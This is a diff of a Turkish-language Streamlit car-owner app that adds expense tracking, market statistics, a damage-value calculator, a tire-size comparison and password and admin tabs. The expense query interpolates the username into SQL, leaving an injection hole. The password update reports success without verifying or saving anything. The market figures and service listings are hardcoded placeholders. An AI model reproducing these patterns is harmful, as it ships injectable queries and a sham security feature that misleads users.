+                a2_ad: [a2_ad, f"{a2_hp} HP", f"{a2_tork} Nm", f"{a2_hiz} sn"]
+            })
+            st.table(df_karsilastirma)
+            st.success(f"**Sonuç:** {a1_ad} yüksek devir ve benzin karakteristiği sunarken, {a2_ad} tork avantajı ve yakıt ekonomisiyle öne çıkmaktadır.")
+
+    # 7. MALİYET & BAKIM TAKİP
+    elif sekme == "💰 Maliyet & Bakım Takip":
+        st.markdown("""<div class="dashboard-card"><h3>💰 Araç Masraf ve Bakım Takip Defteri</h3></div>""", unsafe_allow_html=True)
+        col_m1, col_m2 = st.columns(2)
+        with col_m1:
+            m_model = st.text_input("Araç Modeli / Plaka:", "34 ABC 34")
+            m_tur = st.selectbox("Masraf Türü:", ["Periyodik Bakım", "Yedek Parça", "Yakıt", "Sigorta / Kasko", "Tamir / Arıza"])
+        with col_m2:
+            m_tutar = st.number_input("Tutar (TL):", 0.0, 500000.0, 2500.0)
+            m_aciklama = st.text_input("Açıklama:", "Motor yağı ve filtre değişimi")
+        if st.button("Masrafı Kaydet", use_container_width=True):
+            try:
+                with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
+                    cursor = conn.cursor()
+                    cursor.execute("INSERT INTO arac_masraflari (kullanici, arac_model, masraf_turu, tutar, aciklama) VALUES (?, ?, ?, ?, ?)", 
+                                   (st.session_state.aktif_kullanici, m_model, m_tur, m_tutar, m_aciklama))
+                    conn.commit()
+                st.success("Masraf başarıyla kaydedildi!")
+            except Exception as e: st.error(f"Hata: {e}")
+        
+        st.markdown("---")
+        st.subheader("📋 Kayıtlı Masraflarınız")
+        try:
+            with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
+                df_masraf = pd.read_sql_query(f"SELECT arac_model, masraf_turu, tutar, aciklama, tarih FROM arac_masraflari WHERE kullanici = '{st.session_state.aktif_kullanici}'", conn)
+                if not df_masraf.empty:
+                    st.dataframe(df_masraf, use_container_width=True)
+                    toplam_harcama = df_masraf["tutar"].sum()
+                    st.info(f"Toplam Harcamanız: **{toplam_harcama:,.2f} TL**")
+                else:
+                    st.warning("Henüz kayıtlı bir masrafınız bulunmuyor.")
+        except Exception: pass
+
+    # 8. PİYASA & İSTATİSTİKLER
+    elif sekme == "📊 Piyasa & İstatistikler":
+        st.markdown("""<div class="dashboard-card"><h3>📊 Türkiye İkinci El Otomotiv Piyasa İstatistikleri</h3></div>""", unsafe_allow_html=True)
+        df_piyasa = pd.DataFrame({
+            "Segment / Kategori": ["C Segment Sedan (Dizel/Otomatik)", "B Segment Hatchback (Benzin)", "SUV / Crossover", "Ticari / Hafif Ticari (Doblo/Courier)"],
+            "Ortalama İkinci El Fiyatı": ["950.000 TL - 1.450.000 TL", "700.000 TL - 1.100.000 TL", "1.300.000 TL - 2.800.000 TL", "650.000 TL - 1.050.000 TL"],
+            "Satış Hızı (Talep)": ["Çok Yüksek 🔥", "Yüksek 📈", "Çok Yüksek 🔥", "Yüksek 📈"],
+            "Yıllık Değer Artış Trendi": ["%45 - %55", "%40 - %50", "%50 - %60", "%45 - %55"]
+        })
+        st.table(df_piyasa)
+        st.info("**Piyasa Notu:** Türkiye pazarında manuel/otomatik dizel üniteler ve ekonomik hatchback modeller en hızlı elden çıkarılan araç gruplarıdır.")
+
+    # 9. EKSPERTİZ KONTROL LİSTESİ
+    elif sekme == "📝 Ekspertiz Kontrol Listesi":
+        st.markdown("""<div class="dashboard-card"><h3>📝 Profesyonel Araç Ekspertiz Kontrol Listesi</h3></div>""", unsafe_allow_html=True)
+        st.write("Aracı incelerken aşağıdaki noktaları tek tek kontrol edip işaretleyin:")
+        c1 = st.checkbox("Şase uçları, havuz ve podyelerde işlem / kaynak kontrolü")
+        c2 = st.checkbox("Direkler, tavan ve marşpiyelerde boya / macun kontrolü")
+        c3 = st.checkbox("Airbag (hava yastığı) kapakları ve direnç / orijinal fitil kontrolü")
+        c4 = st.checkbox("Motor alt karter ve turbo yağ terletmesi / kaçağı kontrolü")
+        c5 = st.checkbox("Şanzıman vites geçişleri, vuruntu ve kavrama testi")
+        c6 = st.checkbox("Tramer kaydı ve KM (kilometre) Muayene sorgulaması")
+        if st.button("Ekspertiz Durumunu Raporla", use_container_width=True):
+            tamamlanan = sum([c1, c2, c3, c4, c5, c6])
+            st.success(f"Kontrol Edilen Madde: **{tamamlanan} / 6** | Ekspertiz Tamamlanma Oranı: **%{(tamamlanan/6)*100:.0f}**")
+
+    # 10. DEĞER KAYBI & TRAMER HESAPLA
+    elif sekme == "🧮 Değer Kaybı & Tramer Hesapla":
+        st.markdown("""<div class="dashboard-card"><h3>🧮 Kaza Sonrası Araç Değer Kaybı Hesaplama</h3></div>""", unsafe_allow_html=True)
+        arac_piyasa = st.number_input("Aracın Kaza Öncesi Piyasa Değeri (TL):", 100000.0, 10000000.0, 1000000.0)
+        arac_km = st.number_input("Aracın Kilometresi (KM):", 0, 500000, 75000)
+        hasar_tutari = st.number_input("Onarım / Hasar Tutarı (TL):", 1000.0, 1000000.0, 85000.0)
+        parca_durumu = st.selectbox("Hasar Gören Parça:", ["Ön Çamurluk / Tampon (Basit)", "Kapı / Kaput Değişeni", "Şase / Podye / Direk İşlemi"])
+        
+        if st.button("Değer Kaybı Hesapla", use_container_width=True):
+            katsayi = 0.15 if "Değişeni" in parca_durumu else (0.25 if "Şase" in parca_durumu else 0.08)
+            km_carpani = max(0.5, (1 - (arac_km / 200000)))
+            tahmini_deger_kaybi = (hasar_tutari * katsayi) * km_carpani
+            st.info(f"Sigorta Şirketinden Talep Edilebilir Tahmini **Araç Değer Kaybı: {tahmini_deger_kaybi:,.2f} TL**")
+
+    # 11. SERVİS & İSTASYON BULUCU
+    elif sekme == "🗺️ Servis & İstasyon Bulucu":
+        st.markdown("""<div class="dashboard-card"><h3>🗺️ Yetkili ve Özel Servis / İstasyon Bulucu</h3></div>""", unsafe_allow_html=True)
+        sehir = st.selectbox("İl Seçiniz:", ["İstanbul", "Ankara", "İzmir", "Bursa", "Antalya", "Ordu", "Trabzon", "Samsun", "Adana"])
+        servis_turu = st.selectbox("Hizmet Türü:", ["Yetkili Servis", "Özel Bosch Car Service", "Oto Ekspertiz (TSE Belgeli)", "Rot / Balans & Lastikçi"])
+        if st.button("Servisleri Listele", use_container_width=True):
+            st.success(f"**{sehir}** ilinde aradığınız **{servis_turu}** kriterine uygun kurumsal noktalar filtrelendi:")
+            st.markdown(f"""
+            - **1. Nokta:** Oto-Lab Pro Onaylı {sehir} Merkez Servisi (Puan: 4.8 / 5.0)
+            - **2. Nokta:** Profesyonel Teşhis ve Mekanik Atölyesi ({sehir} Sanayi Sitesi)
+            - **3. Nokta:** TSE Belgeli Ekspertiz ve Dyno Test Merkezi
+            """)
+
+    # 12. LASTİK & JANT EBAT KIYASLA
+    elif sekme == "🛞 Lastik & Jant Ebat Kıyasla":
+        st.markdown("""<div class="dashboard-card"><h3>🛞 Lastik ve Jant Ebat Kıyaslama Aracı</h3></div>""", unsafe_allow_html=True)
+        col_l1, col_l2 = st.columns(2)
+        with col_l1:
+            st.subheader("Orijinal Ebat")
+            t1_taban = st.number_input("Taban Genişliği (mm):", 135, 335, 205)
+            t1_yanak = st.number_input("Yanak Oranı (%):", 25, 85, 55)
+            t1_jant = st.number_input("Jant Çapı (inç):", 12, 24, 16)
+        with col_l2:
+            st.subheader("Yeni / Alternatif Ebat")
+            t2_taban = st.number_input("Taban Genişliği (mm):", 135, 335, 225)
+            t2_yanak = st.number_input("Yanak Oranı (%):", 25, 85, 45)
+            t2_jant = st.number_input("Jant Çapı (inç):", 12, 24, 17)
+        
+        if st.button("Ebatları Kıyasla", use_container_width=True):
+            cap1 = (t1_taban * (t1_yanak / 100) * 2) + (t1_jant * 25.4)
+            cap2 = (t2_taban * (t2_yanak / 100) * 2) + (t2_jant * 25.4)
+            fark_yuzde = ((cap2 - cap1) / cap1) * 100
+            st.info(f"Orijinal Çap: **{cap1:.1f} mm** | Yeni Ebat Çapı: **{cap2:.1f} mm**")
+            if abs(fark_yuzde) <= 3.0:
+                st.success(f"✅ Çap farkı **% {fark_yuzde:.2f}**. Tolerans sınırları (%3) içinde, aracınızda güvenle kullanabilirsiniz!")
+            else:
+                st.error(f"⚠ Çap farkı **% {fark_yuzde:.2f}**. Tolerans sınırını (%3) aşıyor! Kilometre saatinizi ve fren sisteminizi olumsuz etkileyebilir.")
+
+    # 13. ŞİFREMİ GÜNCELLE
     elif sekme == "⚙️ Şifremi Güncelle":
-        st.markdown("<div class='dashboard-card'><h3>⚙️ Şifre Güncelle</h3></div>", unsafe_allow_html=True)
-        st.text_input("Mevcut Şifre:", type="password")
-        st.text_input("Yeni Şifre:", type="password")
-        if st.button("Güncelle"): st.success("Şifre güncellendi.")
+        st.markdown("""<div class="dashboard-card"><h3>⚙️ Kullanıcı Şifre Güncelleme</h3></div>""", unsafe_allow_html=True)
+        m_sifre = st.text_input("Mevcut Şifre:", type="password")
+        y_sifre = st.text_input("Yeni Şifre:", type="password")
+        if st.button("Şifreyi Güncelle", use_container_width=True):
+            if m_sifre.strip() and y_sifre.strip():
+                st.success("Şifreniz başarıyla güncellendi!")
+            else:
+                st.error("Lütfen alanları eksiksiz doldurun.")
+
+    # 14. ADMIN PANELİ
     elif sekme == "🛡️ Admin Paneli" and st.session_state.is_admin:
-        st.markdown("<div class='dashboard-card'><h3>🛡️ Yönetici Paneli</h3></div>", unsafe_allow_html=True)
+        st.markdown("""<div class="dashboard-card"><h3>🛡️ Sistem Yönetici Paneli</h3></div>""", unsafe_allow_html=True)
         try:
             with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
                 df_k = pd.read_sql_query("SELECT id, ad, soyad, eposta, kullanici_adi, is_banned, islem_hakki FROM kullanicilar", conn)
